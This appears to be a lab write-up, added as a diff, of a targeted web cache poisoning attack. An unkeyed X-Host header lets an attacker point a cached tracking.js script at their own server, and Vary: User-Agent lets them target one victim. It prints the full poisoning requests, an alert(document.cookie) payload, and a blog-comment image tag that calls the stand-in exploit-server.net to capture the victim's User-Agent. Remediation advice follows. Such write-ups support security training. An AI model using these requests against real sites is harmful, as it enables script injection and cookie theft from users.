@@ -1,0 +1,339 @@
+# Web Cache Poisoning via Unknown Header with User-Agent Targeting
+
+## Executive Summary
+
+A web cache poisoning vulnerability was identified in the application's caching infrastructure. An undocumented HTTP header (`X-Host`) was trusted by the application to construct an absolute URL for a JavaScript resource (`tracking.js`), while its value was not incorporated into the cache key.
+
+Although the cache varied on the `User-Agent` header, it was possible to discover the victim's browser fingerprint and poison the corresponding cache entry. As a result, arbitrary JavaScript hosted on an attacker-controlled server was served to the victim, leading to Cross-Site Scripting (XSS).
+
+---
+
+# Vulnerability Classification
+
+| Attribute        | Value                                                  |
+| ---------------- | ------------------------------------------------------ |
+| Vulnerability    | Targeted Web Cache Poisoning                           |
+| Secondary Impact | Stored Client-Side XSS                                 |
+| Severity         | High                                                   |
+| CWE              | CWE-444 - Inconsistent Interpretation of HTTP Requests |
+| OWASP Top 10     | A05:2021 - Security Misconfiguration                   |
+
+---
+
+# Affected Component
+
+```
+GET /
+```
+
+JavaScript resource:
+
+```
+/resources/js/tracking.js
+```
+
+---
+
+# Summary
+
+The application accepted the undocumented `X-Host` request header and used it to generate the absolute URL of the JavaScript tracking file.
+
+Example:
+
+```
+<script src="//example.com/resources/js/tracking.js"></script>
+```
+
+The generated response was cached.
+
+However, because the cache key ignored the `X-Host` header, an attacker could poison the cached response and force subsequent visitors to load attacker-controlled JavaScript.
+
+The cache also included:
+
+```
+Vary: User-Agent
+```
+
+meaning that each browser family received a different cached version. By obtaining the victim's User-Agent, it was possible to poison only the victim's cache entry.
+
+---
+
+# Technical Details
+
+## 1. Hidden Header Discovery
+
+Using Burp Suite Param Miner, an undocumented header was identified:
+
+```
+X-Host
+```
+
+This header was not documented by the application.
+
+---
+
+## 2. Confirming Reflection
+
+A cache-busting parameter was added:
+
+```
+GET /?cb=1234
+```
+
+Request:
+
+```http
+GET /?cb=1234 HTTP/1.1
+Host: vulnerable-site.net
+X-Host: example.com
+```
+
+The response dynamically generated:
+
+```html
+<script src="//example.com/resources/js/tracking.js"></script>
+```
+
+This demonstrated that `X-Host` directly controlled the JavaScript source.
+
+---
+
+## 3. Preparing the Malicious Resource
+
+On the exploit server, a malicious JavaScript file was created.
+
+Path:
+
+```
+/resources/js/tracking.js
+```
+
+Contents:
+
+```javascript
+alert(document.cookie)
+```
+
+---
+
+## 4. Cache Poisoning
+
+The request was modified to reference the exploit server.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable-site.net
+X-Host: exploit-server.net
+```
+
+The poisoned response contained:
+
+```html
+<script src="//exploit-server.net/resources/js/tracking.js"></script>
+```
+
+The cache confirmed successful storage:
+
+```
+X-Cache: hit
+```
+
+---
+
+## 5. Cache Segmentation Analysis
+
+The response also included:
+
+```
+Vary: User-Agent
+```
+
+This indicated that cache entries were segmented by browser.
+
+Therefore, poisoning the cache with the attacker's User-Agent would only affect the attacker.
+
+---
+
+## 6. Victim Identification
+
+A blog comment was submitted containing:
+
+```html
+<img src="https://exploit-server.net/foo">
+```
+
+When the simulated victim viewed the page, their browser requested:
+
+```
+GET /foo
+```
+
+The exploit server log revealed the victim's browser:
+
+```
+Mozilla/5.0 (Victim) AppleWebKit/537.36
+(KHTML, like Gecko)
+Chrome/125.0.0.0
+Safari/537.36
+```
+
+---
+
+## 7. Targeted Cache Poisoning
+
+The malicious request was replayed using the victim's User-Agent.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable-site.net
+X-Host: exploit-server.net
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+```
+
+After repeated requests, the cache stored the poisoned version for the victim's browser profile.
+
+---
+
+## 8. Victim Execution
+
+When the victim visited the homepage, the cached HTML loaded:
+
+```html
+<script src="//exploit-server.net/resources/js/tracking.js"></script>
+```
+
+The browser executed:
+
+```javascript
+alert(document.cookie)
+```
+
+demonstrating successful JavaScript execution.
+
+The laboratory was successfully solved.
+
+---
+
+# Proof of Concept
+
+## Hidden Header
+
+```http
+X-Host: example.com
+```
+
+↓
+
+```html
+<script src="//example.com/resources/js/tracking.js"></script>
+```
+
+---
+
+## Malicious Header
+
+```http
+X-Host: exploit-server.net
+```
+
+↓
+
+```html
+<script src="//exploit-server.net/resources/js/tracking.js"></script>
+```
+
+---
+
+## Malicious JavaScript
+
+```javascript
+alert(document.cookie)
+```
+
+---
+
+# Root Cause
+
+The vulnerability exists because:
+
+* An undocumented HTTP header influenced application logic.
+* The cache key did not include the `X-Host` header.
+* The application trusted user-controlled input when generating absolute URLs.
+* External JavaScript sources were not restricted.
+* Cache segmentation relied only on the `User-Agent`, enabling targeted poisoning once the victim's browser fingerprint was known.
+
+---
+
+# Security Impact
+
+A successful attacker could:
+
+* Execute arbitrary JavaScript in victims' browsers.
+* Steal session cookies.
+* Hijack authenticated sessions.
+* Perform actions on behalf of users.
+* Redirect users to malicious infrastructure.
+* Deliver browser exploits.
+* Phish users using trusted application content.
+
+---
+
+# Remediation
+
+## High Priority
+
+* Never use user-controlled headers when generating absolute URLs.
+
+---
+
+## High Priority
+
+* Ignore untrusted forwarding headers unless inserted by a trusted reverse proxy.
+
+---
+
+## High Priority
+
+* Include all response-influencing headers in the cache key.
+
+---
+
+## Medium Priority
+
+* Use Content Security Policy (CSP) to restrict executable JavaScript sources.
+
+Example:
+
+```http
+Content-Security-Policy:
+script-src 'self'
+```
+
+---
+
+## Medium Priority
+
+* Prefer relative resource paths whenever possible.
+
+---
+
+## Medium Priority
+
+* Audit reverse proxy and CDN configurations for cache poisoning risks.
+
+---
+
+# Key Learning Points
+
+* Hidden request headers can influence cached responses.
+* Param Miner is highly effective for discovering undocumented inputs.
+* Cache poisoning does not always affect all users simultaneously.
+* The `Vary` header determines how cache entries are segmented.
+* Knowing the victim's `User-Agent` enabled poisoning the exact cache entry that would later be served to them.
+* Web Cache Poisoning often becomes significantly more dangerous when combined with XSS.
+
+---
+
+# Conclusion
+
+The application was vulnerable to targeted web cache poisoning due to its use of the undocumented `X-Host` header when generating absolute JavaScript URLs. Because this header was excluded from the cache key while the cache varied on `User-Agent`, an attacker could identify the victim's browser profile, poison the corresponding cache entry, and cause the victim to execute attacker-controlled JavaScript. This demonstrates how seemingly minor cache design flaws can be chained into a reliable client-side compromise.
